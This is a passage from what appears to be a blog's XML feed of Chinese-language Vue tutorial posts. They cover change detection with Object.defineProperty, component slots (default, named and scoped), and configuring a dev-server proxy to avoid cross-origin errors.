class="hljs-keyword">this</span>.value = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>()<br>    &#125;<br><br>    <span class="hljs-keyword">get</span> () &#123;<br>        Dep.target = <span class="hljs-keyword">this</span><span class="hljs-comment">//将this也就是Watcher赋给当前的target实现一个转换</span><br>        value = <span class="hljs-keyword">this</span>.getter.call(vm, vm)<br>        Dep.target = undefined<br>    &#125;<br><br>    update () &#123;<span class="hljs-comment">//data.a.b.c的值发生变化后触发，更新数据</span><br>        <span class="hljs-keyword">const</span> oldValue = <span class="hljs-keyword">this</span>.value<br>        <span class="hljs-keyword">this</span>.value = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">get</span>()<br>        <span class="hljs-keyword">this</span>.cb.call(<span class="hljs-keyword">this</span>.vm, <span class="hljs-keyword">this</span>.value, oldValue)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="深入侦测"><a href="#深入侦测" class="headerlink" title="深入侦测"></a>深入侦测</h4><p>现在我们需要侦测这个属性的子属性（有点类似于深度监视）。我们加入一个递归侦测</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> walk (obj: Object) &#123;<br>  const keys = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Object</span>.</span></span>keys(obj)<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; keys.length; i++) &#123;<br>    define<span class="hljs-constructor">Reactive(<span class="hljs-params">obj</span>, <span class="hljs-params">keys</span>[<span class="hljs-params">i</span>], <span class="hljs-params">obj</span>[<span class="hljs-params">keys</span>[<span class="hljs-params">i</span>]])</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们使用walk将这个对象的下一级转换为响应式的数据，在触发<code>defineReactive</code>的时候，再调用一次walk，如果此时的数据的object，那么就会再把下一级进行转换。就这样套娃直到下一次不再是对象，代表我们已经将所有子数据转换成响应式了。</p><p>关于<code>defineReactive()</code>函数，其实是用于将set改变后的数据传给get，形成数据的响应式。</p><p>源码是这样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//自定义defineReactive函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">defineReactive</span>(<span class="hljs-params">data, key, val</span>) </span>&#123;<br>    <span class="hljs-built_in">Object</span>.defineProperty(data, key, &#123;<br>        <span class="hljs-comment">//可枚举</span><br>        <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-comment">//可以被delete</span><br>        <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-comment">//getter：数据劫持</span><br>        <span class="hljs-function"><span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span> &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;正在访问&quot;</span> + key + <span class="hljs-string">&quot;属性&quot;</span>);<br>            <span class="hljs-keyword">return</span> val;<br>        &#125;,<br>        <span class="hljs-comment">//setter</span><br>        <span class="hljs-function"><span class="hljs-title">set</span>(<span class="hljs-params">newValue</span>)</span> &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;正在改变&quot;</span> + key + <span class="hljs-string">&quot;属性&quot;</span>, newValue)<br>            <span class="hljs-keyword">if</span> (val !== newValue) &#123;<br>               val = newValue<br>            &#125;<br>        &#125;<br>    &#125;)<br>&#125;<br><span class="hljs-keyword">var</span> obj = &#123;&#125;;<br>defineReactive(obj, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">10</span>)<br><span class="hljs-built_in">console</span>.log(obj.c);<span class="hljs-comment">//10</span><br><br></code></pre></td></tr></table></figure><p>set触发之后val的值就和newValue一致了，调用get函数的时候获取到的值就是set更新之后的值了。</p><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>但是我们的代码依然有漏洞，在新增数据或者删除数据的时候，我们依然无法收到通知</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 新增</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">walk</span> (<span class="hljs-params">obj: <span class="hljs-built_in">Object</span></span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> keys = <span class="hljs-built_in">Object</span>.keys(obj)<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; keys.length; i++) &#123;<br>    defineReactive(obj, keys[i], obj[keys[i]])<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">defineReactive</span> (<span class="hljs-params">data, key, val</span>) </span>&#123;<br>    walk(val) <span class="hljs-comment">// 新增</span><br>    <span class="hljs-keyword">let</span> dep = <span class="hljs-keyword">new</span> Dep()<br>    <span class="hljs-built_in">Object</span>.defineProperty(data, key, &#123;<br>        <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">get</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>            dep.depend()<br>            <span class="hljs-keyword">return</span> val<br>        &#125;,<br>        <span class="hljs-attr">set</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">newVal</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(val === newVal)&#123;<br>                <span class="hljs-keyword">return</span><br>            &#125;<br><br>            dep.notify()<br>            val = newVal<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-array变化侦测"><a href="#2-array变化侦测" class="headerlink" title="2.array变化侦测"></a>2.array变化侦测</h3><p>array变化侦测是使用一个拦截器覆盖了<code>Array.prototype</code>，操作数组的时候就会触发这个拦截器</p><h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>拦截器代码</p><p>创建arrayProto，后面会使用arrayProto去覆盖Array.prototype</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">const</span> <span class="hljs-built_in">array</span>Proto = Array.prototype<br>export <span class="hljs-keyword">const</span> <span class="hljs-built_in">array</span>Methods = Object.create(<span class="hljs-built_in">array</span>Proto)<br></code></pre></td></tr></table></figure><p>对数组方法调用forEach，每一个都做一个defineProperty，接收几个参数设置forEach遍历得到的<code>method</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">;[<br>  <span class="hljs-string">&#x27;push&#x27;</span>,<br>  <span class="hljs-string">&#x27;pop&#x27;</span>,<br>  <span class="hljs-string">&#x27;shift&#x27;</span>,<br>  <span class="hljs-string">&#x27;unshift&#x27;</span>,<br>  <span class="hljs-string">&#x27;splice&#x27;</span>,<br>  <span class="hljs-string">&#x27;sort&#x27;</span>,<br>  <span class="hljs-string">&#x27;reverse&#x27;</span><br>]<br>.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(method)</span> </span>&#123;<br>  <span class="hljs-comment">// cache original method</span><br>  <span class="hljs-keyword">const</span> original = arrayProto[method]<br><br>  Object.defineProperty(arrayMethods, method, &#123;<br>    value: <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mutator</span> <span class="hljs-params">(<span class="hljs-rest_arg">...args</span>)</span> </span>&#123;<br>      console.log(method) <span class="hljs-comment">// 打印数组方法</span><br>      <span class="hljs-keyword">return</span> original.apply(<span class="hljs-keyword">this</span>, args)<br>    &#125;,<br>    enumerable: <span class="hljs-literal">false</span>,<br>    writable: <span class="hljs-literal">true</span>,<br>    configurable: <span class="hljs-literal">true</span><br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>使用拦截器覆盖array原型</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">export <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Observer</span> </span>&#123;<br>  <span class="hljs-keyword">constructor</span> (value: any) &#123;<br>    <span class="hljs-keyword">this</span>.value = value<br>    <span class="hljs-keyword">this</span>.dep = new Dep()<br>    <span class="hljs-keyword">this</span>.vmCount = <span class="hljs-number">0</span><br>    def(value, <span class="hljs-string">&#x27;__ob__&#x27;</span>, <span class="hljs-keyword">this</span>)<br><br>    <span class="hljs-keyword">if</span> (Array.isArray(value)) &#123;<br>      value.__proto__ = arrayMethods <span class="hljs-comment">// 新增</span><br>      <span class="hljs-keyword">this</span>.observeArray(value)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">this</span>.walk(value)<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>插槽</title>
    <link href="/2022/05/12/%E6%8F%92%E6%A7%BD/"/>
    <url>/2022/05/12/%E6%8F%92%E6%A7%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h1><p>我们现在需求三个列表，包含三部分内容</p><p><img src="D:\新建文件夹\文件\GitHub\pic\vue\插槽\产品样例.png" alt="产品样例"></p><p>构造Category组件，但是由于我们页面是对Category组件的复用，所以我们难以得到三个很大区别的列表，我们需要列表自己选择准备填入的数据。</p><p>tips：可以说插槽就是组件间通信的一种</p><h2 id="1-默认插槽"><a href="#1-默认插槽" class="headerlink" title="1.默认插槽"></a>1.默认插槽</h2><p>最简单的插槽</p><p>使用插槽的第一步：将组件标签改写为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Category</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;美食&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 加入准备填入的内容 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://s3.ax1x.com/2021/01/16/srJlq0.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在组价标签中加入准备传入的数据</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;category&quot;</span>&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">title</span>&#125;&#125;</span><span class="xml">分类<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="xml">      <span class="hljs-comment">&lt;!-- 默认插槽 --&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span>没有数据传入的时候显示我<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>slot会根据上一段代码中，组件标签中的数据，将其放入列表中的对应位置</p><p>但是，这种方式的缺点便是，只能将填入的数据一股脑的放入到一个slot中，不够灵活。</p><h2 id="2-具名插槽"><a href="#2-具名插槽" class="headerlink" title="2.具名插槽"></a>2.具名插槽</h2><p>顾名思义，具名插槽就是有name属性的插槽</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;category&quot;</span>&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">title</span>&#125;&#125;</span><span class="xml">分类<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="xml">      <span class="hljs-comment">&lt;!-- 默认插槽 --&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>没有数据传入的时候显示我<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span>没有数据传入的时候显示我<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在slot属性中加入name属性以区分不同的插槽</p><p>而我们的数据部分也应该署名自己属于那个插槽</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Category</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;美食&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 加入准备填入的内容 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&#x27;center&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://s3.ax1x.com/2021/01/16/srJlq0.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&#x27;footer&#x27;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://tspigeon.github.io&quot;</span>&gt;</span>更多美食<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br></code></pre></td></tr></table></figure><p>特别的如果我们的数据包含多个标签，可以使用div或者template包裹起来</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span>//如果使用<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>那么我们可以把slot写成<span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-slot:footer</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://tspigeon.github.io&quot;</span>&gt;</span>单机游戏<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://tspigeon.github.io&quot;</span>&gt;</span>网页游戏<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-作用域插槽"><a href="#3-作用域插槽" class="headerlink" title="3.作用域插槽"></a>3.作用域插槽</h2><p>作用域插槽适用于数据和结构分离的插槽</p><p>因为数据和结构不再一个组件当中–（数据在Category中，结构在app中），所以我们使用作用域插槽</p><p>首先使用作用域插槽传输数据：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">//Category组件中包含数据和插槽</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;category&quot;</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">title</span>&#125;&#125;</span><span class="xml">分类<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">:games</span>=<span class="hljs-string">&#x27;games&#x27;</span>&gt;</span>没有数据传入的时候显示我<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后在app组件中接收数据</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Category</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;游戏&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-comment">&lt;!-- 这里必须使用template包裹并写上scope或者slot-scope --&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(g,index) in item.games&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&#x27;index&#x27;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>scope接收的名字可以与发送的名字不一样=&gt;（比如这里发送的时候是game，接收是Item，有点类似于函数的变量接收）</p><p>这样插槽形式适用于:根据数据生成的结构是由使用者（这里是我们的app）决定的</p><p>同时作用域插槽也可以有名字，加入一个name属性和slot属性即可</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置代理</title>
    <link href="/2022/05/03/%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2022/05/03/%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h1><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>我们在使用Ajax的axios方式发送请求的时候，时常会出现跨域问题（违反同源策略，也就是我们这里的端口号不同，8080向5000发了请求）</p><p><img src="https://s2.loli.net/2022/05/03/JH1OdeZtEY8zFcA.png" alt="配置跨域报错.png"></p><p>而我们现在就学习如何通过vue解决跨域问题</p><h2 id="方式1："><a href="#方式1：" class="headerlink" title="方式1："></a>方式1：</h2><p>其实我们处理这个问题的方法有很多 ，在我们学习Ajax的时候就会经常使用，比如Nginx就是后端人员帮助我们配置代理的一个方法。但是对于我们的vue来说，<strong>我们使用的是 建立一个代理服务器（开在相同的端口-8080），通过代理服务器向5000端口服务器发请求。</strong></p><p>对应的参考在：vue官网-cli-配置参考-devServer.proxy</p><h3 id="具体实现："><a href="#具体实现：" class="headerlink" title="具体实现："></a>具体实现：</h3><p>我们打开vue.config.js</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">module</span>.<span class="hljs-keyword">exports</span> = defineConfig(&#123;<br>  lintOnSave:<span class="hljs-keyword">false</span>,  <span class="hljs-comment">//关闭语法检查</span><br>  <span class="hljs-comment">//开启代理服务器</span><br>  devServer:&#123;<br>    proxy:<span class="hljs-string">&#x27;http://localhost:5000&#x27;</span><br>  &#125; <br>&#125;)<br></code></pre></td></tr></table></figure><p>这样我们就在8080端口开启了一个代理服务器</p><p>对应的前端代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">getStudent</span>(<span class="hljs-params"></span>)</span>&#123;<br>      axios.get(<span class="hljs-string">&#x27;http://localhost:8080/students&#x27;</span>).then(<span class="hljs-comment">//8080代理服务器，把请求转发给5000，所以我们这里找8080要数据</span><br>        <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;请求成功了&#x27;</span>,response.data);<span class="hljs-comment">//获取成果的数据需要.data</span><br>        &#125;,<br>        <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;请求失败了&#x27;</span>,error.message);<span class="hljs-comment">//获取失败的信息，具体需要加message</span><br>        &#125;<br>        )<br>  &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><p>第一：如果请求的资源在8080代理有重名的，也就是我们的public文件夹当中，那么就不会向5000发送请求，会直接返回public中的数据，而当然就是错误的数据。</p><p>第二：我们配置代理的时候只能配置一个 proxy，也就代表着我们的代理服务器只能向一个源服务器发送请求。</p><h2 id="方式2："><a href="#方式2：" class="headerlink" title="方式2："></a>方式2：</h2><p>方式二会比方式一复杂一点，但是就解决了我们上面提到的两个问题</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>首先还是参照官方文档将devServer的具体形式写入config.js:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">devServer: &#123;<br>    proxy: &#123;<br>      <span class="hljs-regexp">//</span>第一个代理服务器<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<span class="hljs-regexp">//</span>只要请求前缀是/api就触发<br>        target: <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span>,<br>        pathRewrite:&#123;<span class="hljs-string">&#x27;^/api&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<span class="hljs-regexp">//</span>正则表达式将代/api的都换成<span class="hljs-string">&#x27;&#x27;</span>空串<br>        ws: true,<span class="hljs-regexp">//</span>用于支持websocket<br>        changeOrigin: true<span class="hljs-regexp">//</span>申请的时候改变自己的端口号为<span class="hljs-number">5000</span>(host中)<br>      &#125;,<br>      <span class="hljs-regexp">//</span>第二个代理服务器<br>      <span class="hljs-string">&#x27;/foo&#x27;</span>: &#123;<br>        target:  <span class="hljs-string">&#x27;http://localhost:5001&#x27;</span>,<br>        pathRewrite:&#123;<span class="hljs-string">&#x27;^/foo&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<br>        ws:true,<br>        changeOrigin:true<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>注意我们这里的pathRewrite，重写我们的请求路径</p><p>前端代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>获取学生信息<br>axios.get(<span class="hljs-string">&#x27;http://localhost:8080/api/students&#x27;</span>).then(<span class="hljs-regexp">//</span>注意这样会将<span class="hljs-regexp">/api/</span>students也带给服务器--会导致报错<br>        response =&gt; &#123;<br>          console.log(<span class="hljs-string">&#x27;请求成功了&#x27;</span>,response.data);<span class="hljs-regexp">//</span>获取成果的数据需要.data<br>        &#125;,<br>        error =&gt; &#123;<br>          console.log(<span class="hljs-string">&#x27;请求失败了&#x27;</span>,error.message);<span class="hljs-regexp">//</span>获取失败的信息，具体需要加message<br>        &#125;<br>        )<br><span class="hljs-regexp">//</span>获取汽车信息<br>axios.get(<span class="hljs-string">&#x27;http://localhost:8080/foo/cars&#x27;</span>).then(<span class="hljs-regexp">//</span>注意这样会将<span class="hljs-regexp">/api/</span>students也带给服务器--会导致报错<br>        response =&gt; &#123;<br>          console.log(<span class="hljs-string">&#x27;请求成功了&#x27;</span>,response.data);<span class="hljs-regexp">//</span>获取成果的数据需要.data<br>        &#125;,<br>        error =&gt; &#123;<br>          console.log(<span class="hljs-string">&#x27;请求失败了&#x27;</span>,error.message);<span class="hljs-regexp">//</span>获取失败的信息，具体需要加message<br>        &#125;<br>        